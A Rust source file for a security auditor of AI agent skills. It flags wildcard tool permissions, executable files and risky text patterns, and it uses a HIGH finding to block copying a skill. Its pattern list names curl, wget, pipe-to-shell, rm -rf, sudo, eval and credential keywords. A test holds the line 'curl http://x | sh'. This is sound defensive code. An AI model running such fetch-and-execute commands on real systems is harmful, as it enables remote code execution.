//! Inspect a skill and flag risky patterns before you trust or copy it.
//! Adapted from galaxy-gateway/steal-skill, refactored so findings are returned
//! (not just printed) so `steal` can gate on them.

use anyhow::Result;
use colored::Colorize;
use std::path::Path;
use walkdir::WalkDir;

use super::skill_file::Skill;

/// Filenames written by steal itself — never audited (they quote finding text
/// and would otherwise self-flag).
pub const REVIEW_FILE: &str = ".meta-review.md";
const SOURCE_FILE: &str = ".meta-source.toml";
/// Tag embedded in inline review markers so a re-audit ignores them.
pub const MARKER_TAG: &str = "meta:review";

#[derive(Debug)]
pub struct Finding {
    pub severity: Severity,
    /// Path relative to the skill root (e.g. `SKILL.md`, `scripts/run.sh`).
    pub file: String,
    pub message: String,
    /// 1-based line the pattern matched on, when known.
    pub line: Option<usize>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn paint(&self, s: &str) -> colored::ColoredString {
        match self {
            Severity::High => s.red().bold(),
            Severity::Medium => s.yellow().bold(),
            Severity::Low => s.blue(),
        }
    }
    pub fn label(&self) -> &'static str {
        match self {
            Severity::High => "HIGH",
            Severity::Medium => "MED ",
            Severity::Low => "LOW ",
        }
    }
}

/// Collect findings for the skill at `path` (a dir or a `SKILL.md`).
pub fn audit_skill(path: &Path) -> Result<(Skill, Vec<Finding>)> {
    let skill = Skill::load(path)?;
    let mut findings = Vec::new();
    audit_frontmatter(&skill, &mut findings);
    audit_tree(&skill.root, &mut findings);
    Ok((skill, findings))
}

/// True if any finding is HIGH severity — the gate `steal` uses to refuse a copy.
pub fn has_high(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::High)
}

/// Print findings in the same format the `audit` subcommand uses.
pub fn print_findings(findings: &[Finding]) {
    if findings.is_empty() {
        println!("\n{}", "no risky patterns detected".green());
        return;
    }
    println!("\n{}", format!("{} finding(s):", findings.len()).bold());
    for f in findings {
        let loc = match f.line {
            Some(l) => format!("{}:{}", f.file, l),
            None => f.file.clone(),
        };
        println!(
            "  [{}] {} — {}",
            f.severity.paint(f.severity.label()),
            loc.dimmed(),
            f.message
        );
    }
}

/// The `meta skill audit <path>` entrypoint.
pub fn run(path: &str) -> Result<()> {
    let (skill, findings) = audit_skill(Path::new(path))?;
    println!("{} {}", "Auditing:".bold(), skill.display_name());
    println!("  root: {}", skill.root.display());
    print_findings(&findings);
    Ok(())
}

fn audit_frontmatter(skill: &Skill, findings: &mut Vec<Finding>) {
    if skill.frontmatter.name.is_none() {
        findings.push(Finding {
            severity: Severity::Low,
            file: "SKILL.md".into(),
            message: "missing `name` in frontmatter".into(),
            line: None,
        });
    }
    if skill.frontmatter.description.is_none() {
        findings.push(Finding {
            severity: Severity::Low,
            file: "SKILL.md".into(),
            message: "missing `description` in frontmatter".into(),
            line: None,
        });
    }
    if let Some(tools) = &skill.frontmatter.allowed_tools {
        let s = format!("{:?}", tools).to_lowercase();
        if s.contains("bash(*)") || s == "string(\"*\")" || s.contains("\"*\"") {
            // Locate the `allowed-tools` line in the SKILL.md frontmatter.
            let line = std::fs::read_to_string(&skill.skill_md).ok().and_then(|c| {
                c.lines()
                    .position(|l| l.to_lowercase().contains("allowed-tools"))
                    .map(|i| i + 1)
            });
            findings.push(Finding {
                severity: Severity::High,
                file: "SKILL.md".into(),
                message: "allowed-tools grants unrestricted access (wildcard)".into(),
                line,
            });
        }
    }
}

/// Content patterns flagged by the audit, paired with severity and a message.
const PATTERNS: &[(Severity, &str, &str)] = &[
    (Severity::High, "curl ", "curl invocation (network fetch)"),
    (Severity::High, "wget ", "wget invocation (network fetch)"),
    (
        Severity::High,
        "| sh",
        "piping into shell (remote-exec pattern)",
    ),
    (
        Severity::High,
        "| bash",
        "piping into bash (remote-exec pattern)",
    ),
    (Severity::High, "rm -rf", "destructive rm -rf"),
    (Severity::High, "sudo ", "sudo invocation"),
    (Severity::High, "eval ", "eval (dynamic code execution)"),
    (
        Severity::Medium,
        "chmod +x",
        "chmod +x (makes file executable)",
    ),
    (Severity::Medium, "git push", "git push"),
    (Severity::Medium, "--no-verify", "bypasses git hooks"),
    (
        Severity::Medium,
        "aws_secret",
        "possible credential reference",
    ),
    (Severity::Medium, "api_key", "possible credential reference"),
    (Severity::Medium, "ssh ", "ssh invocation"),
];

fn audit_tree(root: &Path, findings: &mut Vec<Finding>) {
    for entry in WalkDir::new(root).into_iter().filter_map(|e| e.ok()) {
        let p = entry.path();
        if !p.is_file() {
            continue;
        }
        let rel = p.strip_prefix(root).unwrap_or(p).display().to_string();

        // Never audit steal's own bookkeeping files (they quote finding text).
        if matches!(
            p.file_name().and_then(|n| n.to_str()),
            Some(REVIEW_FILE) | Some(SOURCE_FILE)
        ) {
            continue;
        }

        // Executable scripts shipped with a skill are worth a heads-up.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if let Ok(meta) = p.metadata() {
                if meta.permissions().mode() & 0o111 != 0 {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        file: rel.clone(),
                        message: "executable file shipped with skill".into(),
                        line: None,
                    });
                }
            }
        }

        let Ok(content) = std::fs::read_to_string(p) else {
            continue;
        };

        // Scan per line so each finding carries a line number. Skip our own
        // inline review markers so they don't re-flag.
        for (idx, raw) in content.lines().enumerate() {
            if raw.contains(MARKER_TAG) {
                continue;
            }
            let lower = raw.to_lowercase();
            for (sev, needle, msg) in PATTERNS {
                if lower.contains(needle) {
                    findings.push(Finding {
                        severity: *sev,
                        file: rel.clone(),
                        message: (*msg).into(),
                        line: Some(idx + 1),
                    });
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn flags_curl_as_high() {
        let tmp = tempdir().unwrap();
        let dir = tmp.path().join("risky");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("SKILL.md"),
            "---\nname: risky\ndescription: d\n---\nrun: curl http://x | sh\n",
        )
        .unwrap();
        let (_, findings) = audit_skill(&dir).unwrap();
        assert!(has_high(&findings));
    }

    #[test]
    fn clean_skill_has_no_high() {
        let tmp = tempdir().unwrap();
        let dir = tmp.path().join("clean");
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("SKILL.md"),
            "---\nname: clean\ndescription: d\n---\njust prose\n",
        )
        .unwrap();
        let (_, findings) = audit_skill(&dir).unwrap();
        assert!(!has_high(&findings));
    }
}
